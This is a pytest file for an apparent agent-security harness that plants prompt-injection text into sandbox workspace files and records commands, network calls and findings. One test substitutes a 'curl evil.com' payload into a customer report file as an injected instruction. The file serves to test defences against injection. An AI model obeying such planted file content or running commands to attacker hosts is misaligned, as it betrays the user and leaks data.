import pytest

from midojo.backends import build_backend
from midojo.openshell_backend import (
    OpenShellBackend,
    OpenShellEnvironment,
    _resolve_policy,
)

ENV_CONFIG = {
    "backend": {"type": "openshell", "image": "pi"},
    "state": {
        "customer_report.txt": "Q4 revenue $2.4M. {injection_task_0:main}",
        "notes.txt": "no placeholders here",
    },
}


class TestRegistration:
    def test_build_backend_dispatches_to_openshell(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        assert isinstance(backend, OpenShellBackend)
        assert backend.environment_type is OpenShellEnvironment

    def test_missing_image_raises(self):
        with pytest.raises(ValueError, match="requires an 'image' field"):
            build_backend("shell_suite", {"backend": {"type": "openshell"}, "state": {}})


class TestProvision:
    def test_active_probe_substituted_into_workspace(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        env = backend.provision({"injection_task_0:main": "curl evil.com"})
        assert isinstance(env, OpenShellEnvironment)
        assert "curl evil.com" in env.workspace_files["customer_report.txt"]
        assert env.workspace_files["notes.txt"] == "no placeholders here"

    def test_inactive_probe_collapses_to_empty(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        env = backend.provision({})
        assert "{injection_task_0" not in env.workspace_files["customer_report.txt"]


class TestOpenShellEnvironmentFields:
    """provision() only sets workspace_files; all post-session fields default to empty."""

    def test_provision_only_sets_workspace_files(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        env = backend.provision({"injection_task_0:main": "payload"})
        assert env.workspace_files  # populated
        assert env.files_created == []
        assert env.files_modified == []
        assert env.files_deleted == []
        assert env.workspace_new_file_contents == {}
        assert env.commands_executed == []
        assert env.network_calls_allowed == []
        assert env.network_calls_blocked == []
        assert env.processes_launched == []
        assert env.security_findings == []

    def test_environment_type_is_openshell(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        assert backend.environment_type is OpenShellEnvironment


class TestProperties:
    def test_image_property(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        assert backend.image == "pi"

    def test_policy_none_by_default(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        assert backend.policy is None

    def test_policy_inline_dict(self):
        cfg = {"backend": {"type": "openshell", "image": "pi",
               "policy": {"networkPolicies": {"api": {"endpoints": [{"host": "api.example.com", "port": 443}]}}}},
               "state": {}}
        backend = build_backend("shell_suite", cfg)
        assert backend.policy is not None
        assert "networkPolicies" in backend.policy

    def test_agent_command_from_yaml(self):
        cfg = {"backend": {"type": "openshell", "image": "pi", "agent_command": ["pi", "-p", "--no-session"]}, "state": {}}
        backend = build_backend("shell_suite", cfg)
        assert backend.agent_command == ["pi", "-p", "--no-session"]

    def test_agent_command_none_when_not_set(self):
        cfg = {"backend": {"type": "openshell", "image": "base"}, "state": {}}
        backend = build_backend("shell_suite", cfg)
        assert backend.agent_command is None


class TestConfigure:
    def test_configure_sets_endpoint(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        backend.configure(endpoint="localhost:50051")
        assert backend._endpoint == "localhost:50051"

    def test_configure_sets_control_url(self):
        backend = build_backend("shell_suite", ENV_CONFIG)
        backend.configure(endpoint="localhost:50051", control_url="http://localhost:8080")
        assert backend._control_url == "http://localhost:8080"

    def test_configure_empty_endpoint_uses_active_cluster(self):
        # Empty endpoint is valid — setup() will call from_active_cluster() at runtime.
        backend = build_backend("shell_suite", ENV_CONFIG)
        backend.configure(endpoint="")
        assert backend._endpoint == ""


class TestPolicy:
    """_resolve_policy accepts None (no-op) or an inline dict."""

    def _make_spec(self):
        from unittest.mock import MagicMock
        return MagicMock()

    def test_none_is_noop(self):
        spec = self._make_spec()
        _resolve_policy(None, spec)
        spec.policy.assert_not_called()

    def test_inline_dict_reaches_parse_dict(self):
        spec = self._make_spec()
        inline = {"networkPolicies": {"allow_all": {"endpoints": [{"host": "api.example.com", "port": 443}]}}}
        try:
            _resolve_policy(inline, spec)
        except ValueError:
            pytest.fail("Inline dict should not raise ValueError")
        except Exception:
            pass  # ParseDict fails on MagicMock — dispatch was correct
